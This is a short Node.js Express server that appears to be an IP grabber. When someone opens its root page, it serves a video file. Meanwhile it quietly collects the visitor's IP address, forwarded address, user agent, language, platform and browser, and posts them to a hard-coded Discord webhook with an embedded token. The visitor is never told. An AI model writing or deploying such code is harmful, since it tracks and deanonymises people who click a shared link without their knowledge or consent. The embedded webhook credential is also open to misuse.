const express = require("express");
const app = express();

const path = require("path");

require("dotenv").config();

app.use(express.static("public"));

app.get("/", async (req, res) => {
  const clientIp = req.ip;
  const ipAddress = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"];
  const lang = req.headers["accept-language"]?.split(",")[0] || "Unknown";
  const platform = userAgent
    ? userAgent.split("(")[1].split(")")[0]
    : "Unknown";
  const browser = userAgent
    ? userAgent.split(" ")[userAgent.split(" ").length - 1].split("/")[0]
    : "Unknown";
  const isProxy =
    req.headers["via"] || req.headers["x-forwarded-for"] ? "Yes" : "No";

  const result = `IP Address: ${clientIp}, X-Forwarded-For or Remote Address: ${ipAddress}, User Agent: ${userAgent}, Language: ${lang}, Platform: ${platform}, Browser: ${browser}, Behind Proxy: ${isProxy}`;
  console.log(result);

  fetch(
    "https://discord.com/api/webhooks/1256567974295506995/RxPRfj3UqXLxchKY-nuZtcRrE5jrqcLIm4G7KQLmxqbbE8IPsqNtwuXajZkN1k-go0uh",
    {
      method: "post",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        username: "Serijo ipes",
        content: result,
      }),
    }
  );

  const videoPath = path.join(process.cwd(), "public", "video.mp4");
  res.sendFile(videoPath);
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`Listening to port ${PORT}`);
});
